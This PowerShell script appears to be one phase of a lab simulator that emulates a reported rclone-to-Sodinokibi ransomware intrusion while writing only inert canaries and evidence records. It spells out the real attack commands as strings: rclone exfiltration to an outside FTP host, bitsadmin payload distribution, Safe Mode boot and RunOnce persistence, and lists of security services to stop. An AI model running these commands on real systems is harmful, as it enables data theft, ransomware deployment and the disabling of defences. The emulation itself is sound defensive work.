#Requires -Version 5.1
#Requires -RunAsAdministrator
[CmdletBinding()]param([switch]$LabConfirmed)
. "$PSScriptRoot\IcedRevilSim-utilities.ps1"
Assert-IRSafety -LabConfirmed:$LabConfirmed
$paths = Initialize-IREnvironment

foreach ($relative in @('Finance\2021-budget.xlsx','Legal\contracts.docx','Operations\inventory.csv')) {
    Write-IRFile (Join-Path $paths.Shares $relative) "GENERATED SHARE CANARY for $relative. No user or network-share data was read." synthetic-data
}
$rclone = Join-Path $paths.Payloads 'svchost.exe'
New-IRDecoy $rclone 'Rclone masquerading as svchost.exe' '538078ab6d80d7cf889af3e08f62c4e83358596f31ac8ae8fbc6326839a6bfe5'
Write-IRFile (Join-Path $paths.Payloads 'svchost.conf') "[ftp1]`ntype = ftp`nhost = 45.147.160.5`nport = 443`nSIMULATION = metadata-only; never loaded by a network client" exfil-config
Invoke-IRDecoy $rclone 'svchost.exe --config svchost.conf --progress --no-check-certificate copy "\\ServerName\C$\ShareName" ftp1:/DomainName/FILES/C/ShareName' 'Cobalt Beacon'
Invoke-IRLoopback 443 '45.147.160.5:443' 'Rclone exfiltration marker'
Write-IRFile (Join-Path $paths.Evidence 'rclone-exfiltration.json') (@{reportedSource='\\ServerName\C$\ShareName';reportedDestination='ftp1:/DomainName/FILES/C/ShareName at 45.147.160.5:443';sourceUsed=(Join-Path $paths.Shares 'generated files');filesReadFromRealShares=0;filesTransferred=0;bytesTransferred=0;proxy=$false} | ConvertTo-Json -Depth 5) exfiltration

$domainExe = Join-Path $paths.Payloads 'DomainName.exe'
$bits = Join-Path $paths.Payloads 'bitsadmin.exe'
New-IRDecoy $domainExe 'Sodinokibi executable stand-in' '2896b38ec3f5f196a9d127dbda3f44c7c29c844f53ae5f209229d56fd6f2a59c'
New-IRDecoy $bits 'BITSAdmin deployment stand-in'
Write-IRFile (Join-Path $paths.Payloads 'DomainName.dll') 'INERT SODINOKIBI DLL-NAME CANARY. No PE, export, process-control, boot, or encryption code.' ransomware
Invoke-IRDecoy $bits 'C:\Windows\system32\bitsadmin.exe /transfer debjob /download /priority normal \\DOMIANCONTROLLER\c$\windows\DOMAINNAME.exe C:\Windows\DOMAINNAME.exe' 'RDP cmd or PowerShell on generated host'
Invoke-IRDecoy $domainExe 'C:\Windows\DOMAINNAME.exe -smode; write RunOnce keys; reboot Safe Mode with Networking; login; encrypt' 'RDP cmd or PowerShell on generated host'
Invoke-IRDecoy $domainExe 'C:\Windows\DOMAINNAME.exe *franceisshit; boot out of Safe Mode' 'reported post-impact invocation'
Invoke-IRDecoy $domainExe 'rundll32.exe C:\Windows\DomainName.dll,DllRegisterServer on domain controllers' 'reported Cobalt/RDP operator'

Write-IRFile (Join-Path $paths.Evidence 'runonce-safe-mode.json') (@{
    reportedRunOnce=@('HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce\*AstraZeneca','HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\*franceisshit')
    reportedBootCommands=@('bootcfg /raw /a /safeboot:network /id 1','bcdedit /set {current} safeboot network')
    reportObservedAutoLogon=$false
    registryChanges=0
    bootChanges=0
    reboots=0
    logons=0
} | ConvertTo-Json -Depth 6) impact
Write-IRFile (Join-Path $paths.Evidence 'ransomware-config.json') (@{
    campaignId=7114
    networkEncryption=$false
    representativeProcessesToKill=@('oracle','klnagent','powerpnt','outlook','sql','winword','visio','excel','firefox')
    representativeServicesToKill=@('Sophos AutoUpdate Service','SQLWriter','VeeamDeploymentService','MSSQLSERVER','VSS','SQLSERVERAGENT','HuntressAgent','KaseyaAgent')
    processesKilled=0
    servicesStopped=0
    securityControlsImpaired=$false
} | ConvertTo-Json -Depth 6) impact

foreach ($hostName in @('BEACHHEAD-01','EXCHANGE-CANARY-01','DC-CANARY-01','FILE-CANARY-01','APP-CANARY-01')) {
    $dataRoot = Join-Path $paths.Hosts "$hostName\generated-user-data"
    foreach ($name in @('finance.xlsx.SIMULATED-REvil','operations.docx.SIMULATED-REvil','archive.zip.SIMULATED-REvil')) {
        Write-IRFile (Join-Path $dataRoot $name) "SIMULATED SODINOKIBI IMPACT MARKER: generated text for $hostName/$name. No data encrypted." impact
    }
    Write-IRFile (Join-Path $dataRoot 'README-SODINOKIBI-SIMULATED.txt') 'SIMULATED RANSOM-NOTE CANARY. Reported demand: about 200,000 USD in Monero within seven days, then about 400,000 USD. No Tor address, payment instruction, or real encryption.' note
}
Write-IRFile (Join-Path $paths.Evidence 'impact-outcome.json') (@{reportedDurationMinutes=270;reportedScope='all domain-joined systems';reportedDelayAfterLogonSeconds='10-20';reportedDemandUsd=200000;reportedDemandAfterSevenDaysUsd=400000;reportedNegotiationReductionPercent='20-30';generatedHosts=5;realHostsTouched=0;userFilesRead=0;userFilesEncrypted=0;hostsImpaired=0;servicesStopped=0;securityToolsImpaired=$false} | ConvertTo-Json) impact
Write-IRFile (Join-Path $paths.Evidence 'phase3-negative.json') (@{externalConnections=0;realShareFilesRead=0;filesExfiltrated=0;bytesExfiltrated=0;bitsJobsCreated=0;remoteHostsTouched=0;registryChanges=0;bootChanges=0;reboots=0;logons=0;servicesStopped=0;securityControlsImpaired=$false;userFilesRead=0;userFilesEncrypted=0;hostsImpaired=0} | ConvertTo-Json) safety
Add-IRTimeline 210 collection 'Rclone masquerading as svchost collects and exfiltrates network shares' @{reportRelativeTiming=$true;bytesTransferred=0}
Add-IRTimeline 240 impact 'Ransomware staged on domain controller and BITSAdmin fan-out begins' @{reportRelativeTiming=$true;bitsJobsCreated=0;remoteHostsTouched=0}
Add-IRTimeline 250 impact 'RDP-launched -smode, RunOnce, Safe Mode with Networking, reboot, and login sequence represented' @{registryChanges=0;bootChanges=0;reboots=0;logons=0}
Add-IRTimeline 260 impact 'Non-smode executable and domain-controller DLL paths represented' @{userFilesEncrypted=0;hostsImpaired=0}
Add-IRTimeline 270 impact 'Reported domain-wide Sodinokibi encryption completes after 4.5 hours' @{reportRelativeTiming=$true;userFilesEncrypted=0;hostsImpaired=0}
